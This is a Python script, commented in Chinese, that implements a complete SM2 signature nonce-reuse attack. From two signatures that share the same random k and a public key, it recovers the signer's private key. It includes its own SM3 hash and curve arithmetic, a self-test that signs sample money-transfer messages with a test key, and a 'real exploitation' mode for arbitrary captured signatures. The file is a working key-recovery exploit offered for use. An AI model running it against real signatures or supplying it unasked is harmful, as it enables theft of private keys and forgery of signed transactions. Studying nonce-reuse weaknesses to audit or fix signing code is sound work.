#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SM2 随机数 k 复用攻击 —— 私钥恢复 (零依赖, 纯 Python)
====================================================
原理 (GB/T 32918.2 签名):
    s = (1+d)^-1 · (k − r·d) mod n,  r = (e + x1) mod n,  (x1,y1) = k·G
若同一随机数 k 被用于两个不同消息签名:
    s1 − s2 = d·(1+d)^-1 · (r2 − r1)
    →  v = (s1−s2)/(r2−r1),   d = v/(1−v)        ← 私钥直接恢复

前置条件:
    1. 拿到同一公钥下两笔 SM2 签名 (r,s) 及各自消息 M
    2. 已知公钥 (px,py) —— 用于计算 e = SM3(ZA‖M), 公钥是公开信息(证书/App内)

用法:
    python sm2_k_reuse.py --msg1 <hex> --r1 <hex> --s1 <hex> \
        --msg2 <hex> --r2 <hex> --s2 <hex> --px <hex> --py <hex> [--id IDA]

    # 自检: 用测试私钥生成同 k 双签名并恢复, 验证整条链路
    python sm2_k_reuse.py --selftest
"""
import argparse
import sys
import os

if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
if hasattr(sys.stderr, 'reconfigure'):
    sys.stderr.reconfigure(encoding='utf-8', errors='replace')

# ============ SM2 曲线参数 (GB/T 32918) ============
P = 0xFFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFF
A = 0xFFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFC
B = 0x28E9FA9E9D9F5E344D5A9E4BCF6509A7F39789F515AB8F92DDBCBD414D940E93
N = 0xFFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123
GX = 0x32C4AE2C1F1981195F9904466A39C9948FE30BBFF2660BE1715A4589334C74C7
GY = 0xBC3736A2F4F6779C59BDCEE36B692153D0A9877CC62A474002DF32E52139F0A0
DEFAULT_ID = b'1234567812345678'   # 默认 IDA (国标测试用)


# ============ SM3 哈希 (GB/T 32905) ============
SM3_IV = [0x7380166f, 0x4914b2b9, 0x172442d7, 0xda8a0600,
          0xa96f30bc, 0x163138aa, 0xe38dee4d, 0xb0fb0e4e]
T_J = [0x79cc4519] * 16 + [0x7a879d8a] * 48
M32 = 0xffffffff


def _rotl32(x, n):
    return ((x << n) | (x >> (32 - n))) & M32


def _ffj(x, y, z, j):
    return (x ^ y ^ z) if j < 16 else ((x & y) | (x & z) | (y & z))


def _ggj(x, y, z, j):
    return (x ^ y ^ z) if j < 16 else ((x & y) | ((~x & M32) & z))


def _p0(x):
    return x ^ _rotl32(x, 9) ^ _rotl32(x, 17)


def _p1(x):
    return x ^ _rotl32(x, 15) ^ _rotl32(x, 23)


def sm3_hash(data: bytes) -> bytes:
    """SM3 摘要, 返回 32 字节。"""
    # 1. 填充: 0x80 + 0x00... + 64bit 长度
    msg = bytearray(data)
    bit_len = len(msg) * 8
    msg.append(0x80)
    while len(msg) % 64 != 56:
        msg.append(0)
    msg += bit_len.to_bytes(8, 'big')
    # 2. 初始化寄存器
    v = list(SM3_IV)
    # 3. 分块压缩
    for off in range(0, len(msg), 64):
        block = msg[off:off + 64]
        w = [int.from_bytes(block[i * 4:i * 4 + 4], 'big') for i in range(16)]
        for j in range(16, 68):
            w.append(_p1(w[j - 16] ^ w[j - 9] ^ _rotl32(w[j - 3], 15))
                     ^ _rotl32(w[j - 13], 7) ^ w[j - 6])
        wp = [w[j] ^ w[j + 4] for j in range(64)]
        a, b, c, d, e, f, g, h = v
        for j in range(64):
            ss1 = _rotl32((_rotl32(a, 12) + e + _rotl32(T_J[j], j % 32)) & M32, 7)
            ss2 = ss1 ^ _rotl32(a, 12)
            tt1 = (_ffj(a, b, c, j) + d + ss2 + wp[j]) & M32
            tt2 = (_ggj(e, f, g, j) + h + ss1 + w[j]) & M32
            d, c, b, a = c, _rotl32(b, 9), a, tt1
            h, g, f, e = g, _rotl32(f, 19), e, _p0(tt2)
        v = [(v[i] ^ [a, b, c, d, e, f, g, h][i]) & M32 for i in range(8)]
    return b''.join(x.to_bytes(4, 'big') for x in v)


# ============ SM2 椭圆曲线运算 (仿射坐标) ============
def _inv(x, mod):
    return pow(x, -1, mod)


def point_add(p1, p2):
    if p1 is None:
        return p2
    if p2 is None:
        return p1
    x1, y1 = p1
    x2, y2 = p2
    if x1 == x2 and (y1 + y2) % P == 0:
        return None
    if p1 == p2:
        lam = (3 * x1 * x1 + A) * _inv(2 * y1, P) % P
    else:
        lam = (y2 - y1) * _inv(x2 - x1, P) % P
    x3 = (lam * lam - x1 - x2) % P
    y3 = (lam * (x1 - x3) - y1) % P
    return (x3, y3)


def scalar_mul(k, g):
    r = None
    add = g
    while k:
        if k & 1:
            r = point_add(r, add)
        add = point_add(add, add)
        k >>= 1
    return r


# ============ SM2 ZA 与 e ============
def sm2_za(ida: bytes, pub: tuple) -> bytes:
    px, py = pub
    entl = (len(ida) * 8).to_bytes(2, 'big')
    return sm3_hash(entl + ida
                    + A.to_bytes(32, 'big') + B.to_bytes(32, 'big')
                    + GX.to_bytes(32, 'big') + GY.to_bytes(32, 'big')
                    + px.to_bytes(32, 'big') + py.to_bytes(32, 'big'))


def sm2_e(msg: bytes, ida: bytes, pub: tuple) -> int:
    return int.from_bytes(sm3_hash(sm2_za(ida, pub) + msg), 'big')


# ============ 签名/验签 (自检用) ============
def sm2_sign(msg: bytes, d: int, k: int, ida: bytes, pub: tuple):
    e = sm2_e(msg, ida, pub)
    x1, _ = scalar_mul(k, (GX, GY))
    r = (e + x1) % N
    s = _inv(1 + d, N) * (k - r * d) % N
    return r, s


def sm2_verify(msg: bytes, r: int, s: int, pub: tuple, ida: bytes) -> bool:
    if not (1 <= r < N and 1 <= s < N):
        return False
    e = sm2_e(msg, ida, pub)
    t = (r + s) % N
    if t == 0:
        return False
    p = point_add(scalar_mul(s, (GX, GY)), scalar_mul(t, pub))
    if p is None:
        return False
    return (e + p[0]) % N == r


# ============ 攻击主逻辑 ============
def recover(m1, r1, s1, m2, r2, s2, pub, ida):
    e1 = sm2_e(m1, ida, pub)
    e2 = sm2_e(m2, ida, pub)

    x1_1 = (r1 - e1) % N
    x1_2 = (r2 - e2) % N
    if x1_1 != x1_2:
        print("[-] 两签名的 k 值不同 (x1 不一致), 无法用 k 复用恢复")
        print(f"    x1(签名1) = {x1_1:064x}")
        print(f"    x1(签名2) = {x1_2:064x}")
        return None

    # v = (s1-s2)/(r2-r1);  d = v/(1-v)
    num = (s1 - s2) % N
    den = (r2 - r1) % N
    if den == 0:
        print("[-] r2 == r1, 公式退化 (检查是否输入相同签名)")
        return None
    v = num * _inv(den, N) % N
    if (1 - v) % N == 0:
        print("[-] 1-v == 0, 无法求逆")
        return None
    d = v * _inv((1 - v) % N, N) % N
    return d


def main():
    ap = argparse.ArgumentParser(description='SM2 k 复用私钥恢复 (零依赖)')
    ap.add_argument('--selftest', action='store_true', help='自检整条链路')
    ap.add_argument('--msg1', help='消息1 hex')
    ap.add_argument('--r1', help='签名1 r (hex)')
    ap.add_argument('--s1', help='签名1 s (hex)')
    ap.add_argument('--msg2', help='消息2 hex')
    ap.add_argument('--r2', help='签名2 r (hex)')
    ap.add_argument('--s2', help='签名2 s (hex)')
    ap.add_argument('--px', help='公钥 x (hex)')
    ap.add_argument('--py', help='公钥 y (hex)')
    ap.add_argument('--id', default=DEFAULT_ID.decode(), help=f'IDA (默认 {DEFAULT_ID.decode()})')
    args = ap.parse_args()

    if args.selftest:
        d = 0x3945208F7B2144B13F36E38AC6D39F95889393692860B51A42FB81EF4DF7C5B8
        pub = scalar_mul(d, (GX, GY))
        ida = args.id.encode()
        m1 = b'TRANSFER 100 CNY TO account_A'
        m2 = b'TRANSFER 999999 CNY TO account_B'
        k = 0x59276E27D506861A16680F3AD9C02DCCEF3CC1FA3CDBE4CE6D54B80DEAC1BC21
        r1, s1 = sm2_sign(m1, d, k, ida, pub)
        r2, s2 = sm2_sign(m2, d, k, ida, pub)
        print(f"[*] 测试私钥 d  = {d:064x}")
        print(f"[*] 公钥 px/py  = {pub[0]:064x} / {pub[1]:064x}")
        print(f"[*] 签名1 (r,s) = {r1:064x} / {s1:064x}")
        print(f"[*] 签名2 (r,s) = {r2:064x} / {s2:064x}")
        rec = recover(m1, r1, s1, m2, r2, s2, pub, ida)
        if rec is None:
            sys.exit(1)
        print(f"\n[+] 恢复私钥 d' = {rec:064x}")
        ok = rec == d
        # 用恢复私钥验签
        ver = sm2_verify(m1, r1, s1, scalar_mul(rec, (GX, GY)), ida)
        print(f"[{'OK' if ok else 'FAIL'}] 恢复私钥 == 测试私钥: {ok}")
        print(f"[{'OK' if ver else 'FAIL'}] 恢复公钥验签通过: {ver}")
        sys.exit(0 if (ok and ver) else 1)

    # 真实利用
    need = [args.msg1, args.r1, args.s1, args.msg2, args.r2, args.s2, args.px, args.py]
    if any(x is None for x in need):
        sys.exit("[-] 需要完整参数: --msg1 --r1 --s1 --msg2 --r2 --s2 --px --py (或 --selftest)")

    m1 = bytes.fromhex(args.msg1)
    m2 = bytes.fromhex(args.msg2)
    r1, s1 = int(args.r1, 16), int(args.s1, 16)
    r2, s2 = int(args.r2, 16), int(args.s2, 16)
    pub = (int(args.px, 16), int(args.py, 16))
    ida = args.id.encode()

    # 先验签, 确保签名本身有效
    if not sm2_verify(m1, r1, s1, pub, ida):
        print("[-] 签名1 验证失败 (公钥/IDA/消息不符, 或签名非法)")
    if not sm2_verify(m2, r2, s2, pub, ida):
        print("[-] 签名2 验证失败 (公钥/IDA/消息不符, 或签名非法)")

    d = recover(m1, r1, s1, m2, r2, s2, pub, ida)
    if d is None:
        sys.exit(1)
    print(f"\n[+] SM2 私钥恢复成功: d = {d:064x}")
    # 交叉验证: 恢复公钥 == 提供公钥
    rec_pub = scalar_mul(d, (GX, GY))
    print(f"[{'OK' if rec_pub == pub else 'WARN'}] 恢复公钥与提供公钥一致")
    if rec_pub != pub:
        print(f"    恢复 px = {rec_pub[0]:064x}")
        print(f"    恢复 py = {rec_pub[1]:064x}")


if __name__ == '__main__':
    main()
